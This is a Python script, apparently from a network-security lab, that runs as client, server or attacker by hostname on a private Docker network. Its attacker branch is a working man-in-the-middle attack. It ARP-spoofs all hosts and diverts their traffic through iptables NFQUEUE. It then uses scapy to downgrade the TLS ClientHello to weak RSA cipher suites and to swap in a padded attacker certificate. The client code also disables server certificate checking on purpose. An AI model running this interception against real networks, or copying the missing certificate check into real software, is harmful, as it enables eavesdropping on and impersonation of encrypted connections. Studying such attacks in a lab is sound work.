# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import socket
import subprocess
import http.client
from time import sleep
import cryptography

import netfilterqueue
import scapy.layers.inet
import tlslite
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP
from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello
from scapy.main import load_layer
from scapy.sendrecv import send
from scapy.utils import hexdump
from tlslite import X509, X509CertChain, parsePEMKey, HandshakeSettings, SessionCache, Checker


TLS_VERSION = (3,2) # 3,2 For tls 1.1, 3,3 for tls 1.2, 3,4 for tls 1.3 (watchout, you might need ecdsa, might not work with rsa... it gives missing supported group error...)

def handler_queue_1(pkt: netfilterqueue.Packet):
    handler_queue_1.pktnum += 1
    print(f"{handler_queue_1.pktnum}) received " + pkt.__str__())
    # PDU = Packet data unit, IP header + IP content!
    # remember, IP packet may be fragmented, but we may be lucky and content may be all inside a single IP packet!
    l3_PDU = pkt.get_payload() # starts with the IP header, continues with the contents (matrioska, TCP is inside IP payload)
    scpy_pkt = IP(l3_PDU)


    if scpy_pkt.haslayer(scapy.layers.inet.TCP):
        print("TCP packet received")
        #scpy_pkt.show2()
        if scpy_pkt.haslayer("TLSClientHello"): # first packet of TLS handshake
            # gotta modify the tls client hello to remove too secure cipher suites!
            # IN our case, we want the client to use only RSA with AES 256_CBC_SHA since he tries to use Ephemeral DIffie hellman instead...
            # so we intercept the packet and replace the Ephemeral choice with AES_128 version of the target cipher suite: this way
            # we don't have to worry about intercepting the server hello (next TCP segment, a syn/ack to the CLient Hello) to
            # modify its ACK number!
            print("--------------------------------------------------------------------------------")
            print("--------------------------------------------------------------------------------")
            print("--------------------------------------------------------------------------------")
            print("TLS client hello captured")
            scpy_pkt.show2()
            print("--------------------------------------------------------------------------------")
            print("--------------------------------------------------------------------------------")
            print("--------------------------------------------------------------------------------")

            tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])

            #ignore the commented code, it was written as an attempt to try to make the attack work by dropping (not overwriting)
            # the unwanted cipher suites
            from scapy.layers.tls.crypto.suites import TLS_RSA_WITH_AES_256_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA
            #tlsmsg.cipherslen = None # By setting it to none, it will rebuild during show2
            tlsmsg.ciphers = [0X00FF,TLS_RSA_WITH_AES_128_CBC_SHA ,TLS_RSA_WITH_AES_256_CBC_SHA]
            #tlsmsg.msglen = None # By setting it to none, it will rebuild during show2

            #print(tlsmsg.show2())

            #scpy_pkt["TCP"].remove_payload()
            #scpy_pkt /= tlsmsg # reattach tls...
            #del scpy_pkt["TLS"].len #got to set to none these layer's len and chksums too...
            del scpy_pkt["TCP"].chksum
            #del scpy_pkt["IP"].len
            del scpy_pkt["IP"].chksum
            #del scpy_pkt["IP"].dataofs

            #print(scpy_pkt["TCP"].show2())
            #print(scpy_pkt["IP"].show2())
            print(scpy_pkt.show2())

            pkt.set_payload(bytes(scpy_pkt))

        elif scpy_pkt.haslayer("TLSServerHello"): #second packet of the TLS handshake...
            # we must forward it as it is, but modify serverCertificate. hich we must instead modify.

            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
            print("TLS server hello captured")
            scpy_pkt.show2()
            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")

            #how many TLS records are stacked in this message?
            n_tls_records = len(scpy_pkt["TCP"].layers()) - 1 # don't count TCP layer...
            print("n_tls_records: " + str(n_tls_records))

            # check each one
            for i in range(1, n_tls_records + 1):
                generic_tls_layer = scpy_pkt.getlayer("TLS", i) # each TLS message is wrapped inside a generic TLS layer,
                                                                    # which has a type, a version, a len and an iv field...

                if generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSCertificate) is not None:
                    # ok we'll change this one...
                    # the other possible layers are
                    # server hello (forward as it is, contains session id),
                    # certificate request (from server to client, needed for RSA exchange, forward as it is even though we'll answer it instead of the client by dropping the relative client layer in the next step)ù
                    # and server hello done (forward as it is)

                    #ok finally, we can adapt the length and padding to not deal with TCP sequential numbers

                    scpy_tls_cert = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSCertificate)

                    # the attacker server certificate is 819 bytes long. the server real certificate is 853 bytes long
                    attacker_certificate_der = open("/app/attacker_server_certificate.der", "rb").read()
                    attacker_certificate_der_len = len(attacker_certificate_der)
                    print(f"attacker certificate length is {attacker_certificate_der_len}")

                    server_certificate_der = open("/app/server_certificate.der", "rb").read()
                    server_certificate_der_len = len(server_certificate_der)
                    #todo: what if negative difference? Then the only way is to actively modify seq fields!
                    attacker_certificate_der_padded = attacker_certificate_der + b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
                    attacker_certificate_der_padded_len = len(attacker_certificate_der_padded)

                    scpy_tls_cert.certs = [(attacker_certificate_der_padded_len, attacker_certificate_der_padded)]
                    scpy_tls_cert.certslen = None
                    scpy_tls_cert.msglen = None

                    # generic_tls_layer is the parent of scpy_tls_cert
                    generic_tls_layer.len = None
                    #generic_tls_layer.padlen = server_certificate_der_len - attacker_certificate_der_len
                    #generic_tls_layer.pad = b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
                    #generic_tls_layer.build_padding()
                    print("------------------------------------------")
                    print("------------------------------------------")
                    print("------------------------------------------")
                    print("------------------------------------------")
                    print(scpy_tls_cert.show2())
                    print("------------------------------------------")
                    del scpy_pkt["TCP"].chksum
                    del scpy_pkt["IP"].chksum
                    del scpy_pkt["IP"].len
                    print(scpy_pkt.show2())
                    print("------------------------------------------")
                    print("------------------------------------------")
                    print("------------------------------------------")
                    print("------------------------------------------")

            print(len(bytes(scpy_pkt)))
            pkt.set_payload(bytes(scpy_pkt))

        pkt.accept()
    else:

        pkt.accept()




# just a static variable inside the handler queue 1 function, to keep track of the number of packets received...
handler_queue_1.pktnum = 0

def check_internet_connection():
    conn = http.client.HTTPSConnection("8.8.8.8", timeout=5)
    try:
        conn.request("HEAD", "/")
        return "Connected to Internet!"
    except Exception:
        return "no connection!"
    finally:
        conn.close()

def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f"Hi, {name}, i'm {socket.gethostname()} and you can find me at {socket.gethostbyname(socket.gethostname())}")  # Press Ctrl+F8 to toggle the breakpoint.
    print("Public ip address: ", check_internet_connection())

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')

    if socket.gethostname() == "client":
        # try to connect via tls to server after 10s...
        print("client connected...")
        p = subprocess.Popen(["ping", "172.18.0.3"])

        sleep(10) # let the arppoison have effect, we'd normally run it for quite some time irl...
        sleep(5) # give some time to the server for setup, before trying to connect...
        #step 1. create a TCP socket and connect to the server...
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect(("172.18.0.3", 443))
        #step 2. construct a TLSConnection
        conn = tlslite.TLSConnection(sock)
        #step 3. call a handshake function (client).
        #        We insert voluntarily a bug here, which is to not check the server's certificate, much like what happens with
        #        old router's control panels: they have https with tls, but their certificate is not installed in the machine.
        #        THe bug is to not insert a checker object in the list of arguments to handshakeclientcert.
        x509 = X509()
        with open("/app/client_certificate.pem") as s:
            x509.parse(s.read())
        chain = X509CertChain([x509])

        with open("/app/RSA_key_client_client.pem") as s:
            private_key = parsePEMKey(s.read(), private=True)

        with open("/app/server_certificate.pem") as s:
            server_certificate = X509().parse(s.read())

        print(server_certificate.sigalg)
        print(server_certificate)

        settings = HandshakeSettings()
        settings.cipherNames=["aes256gcm", "aes256"]
        settings.maxVersion = TLS_VERSION
        settings.keyExchangeNames = ["rsa", "dhe_rsa"]

        try:
            conn.handshakeClientCert(chain,
                                     private_key,
                                     settings=settings#,
                                     # checker= Checker(x509Fingerprint=server_certificate.getFingerprint())
                                     )  # we pass the client certificate and private key to the function, even if the server will not (initially, phase 1) ask for it.
            print("Handshake done")

            conn.sendall(b"Send 50 to Alice")
            sleep(5)

            oldSession = conn.session


        except Exception as e:
            print(e)
        finally:
            conn.close()

        p.kill()
    elif socket.gethostname() == "server":
        # listen to a socket...
        print("server connected...")

        sleep(10) # let the arppoison have effect, we'd normally run it for quite some time irl...
        # step 1. create a TCP socket and connect to the server...
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # step 1s. bind the socket to our address (SERVER) and port, and start listening...
        sock.bind(("172.18.0.3", 443))
        sock.listen(1)
        real_sock, client_address = sock.accept() # accept returns a new socket object, representing the newly socket connected to the client! The old one continues to listen for new connections...
        real_sock.settimeout(20)
        print(f"connected to {client_address}")


        # step 2. construct a TLSConnection
        conn = tlslite.TLSConnection(real_sock)
        # step 3. call a handshake function (server).
        #        We insert voluntarily a bug here, which is to not check the client's certificate from the start
        s = open("/app/server_certificate.pem").read()
        x509 = X509()
        x509.parse(s)
        chain = X509CertChain([x509])

        s = open("/app/RSA_key_server_server.pem").read()
        private_key = parsePEMKey(s, private=True)


        with open("/app/client_certificate.pem") as s:
            client_certificate = X509().parse(s.read())

        settings = HandshakeSettings()
        settings.maxVersion = TLS_VERSION
        settings.cipherNames=["aes256gcm", "aes256"]
        settings.keyExchangeNames = ["rsa", "dhe_rsa"]

        # session cache active, so we can resume laster
        sessionCache = SessionCache()

        try:
            conn.handshakeServer(certChain=chain,
                                 privateKey=private_key,
                                 settings=settings,
                                 sessionCache=sessionCache,
                                 checker=Checker(client_certificate.getFingerprint()),
                                 reqCert=True)  # we pass the server certificate and private key to the function
            print("Handshake done")

            msg = conn.recv(1024)
            print(msg)


        except Exception as e:
            print(e)
        finally:
            conn.close()
            sock.close()


    else:

        print("attacker online...")

        load_layer("tls")

        with open("/dev/null", "wb") as fnull:
            # attacker
            # run arpspoof ASAP
            # p = subprocess.Popen(["ifconfig", "-a"], stdout=1, stderr=1) # use this line or open a terminal to check the interface name, should be eth0
            p = list()
            print("starting arpspoofing...")
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the client
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the client i'm the gateway
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the server
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the server i'm the gateway
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the server i'm the client
            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the client i'm the server
            # subprocess.Popen(["sysctl", "-w" ,"net.ipv4.ip_forward=1"]) # enable port forwarding for intercepted packets... already active and can't modify it since file system is read only.
            print("arpspoofing started.")
            #The iptables chain of interest is FORWARD, since those packets are not destined to us (172.18.0.4), but to OTHER IPs!!!
            #In fact, iptables works at the TCP/IP level (layer 3 and 4), so even if frames (layer 2, ethernet) are directed to us
            # (and according to intuitition our chain of interest would be INPUT), they are still at layer 2!!!!!!
            # And so, IPTABLES, which starts to look into network packets ONLY at layer 3 (IP), THOSE PACKETS ARE NOT DIRECTED TO US AND SO DO NOT PERTAIN TO THE INPUT CHAIN.
            # why this comment? Well, to spare you some time debugging this code!

            print("creating iptables netfilter rules for victim and server...")
            # must capture every packet destined to the server coming from the client, ...
            p.append(subprocess.Popen(
                ["iptables", "-I", "FORWARD", "-s", "172.18.0.2", "-d", "172.18.0.3", "-j", "NFQUEUE", "--queue-num", "1"]))
            #and every packet destined to the client coming from the server...
            p.append(subprocess.Popen(
                ["iptables", "-I", "FORWARD", "-s", "172.18.0.3", "-d", "172.18.0.2",  "-j", "NFQUEUE", "--queue-num","1"]))
            # as they come, they will be ordered in the queue (remember, queues are FIFOs!)
            print("firewall rules created.")

            print("Binding netfilterqueue socket...")
            nfqueue = NetfilterQueue()
            nfqueue.bind(1, handler_queue_1)

            s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
            print("Binded.")

            print("Waiting for packets...")
            try:
                nfqueue.run_socket(s)
            except KeyboardInterrupt:
                print('')
            finally:
                s.close()
                nfqueue.unbind()

            for proc in p:
                proc.kill()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
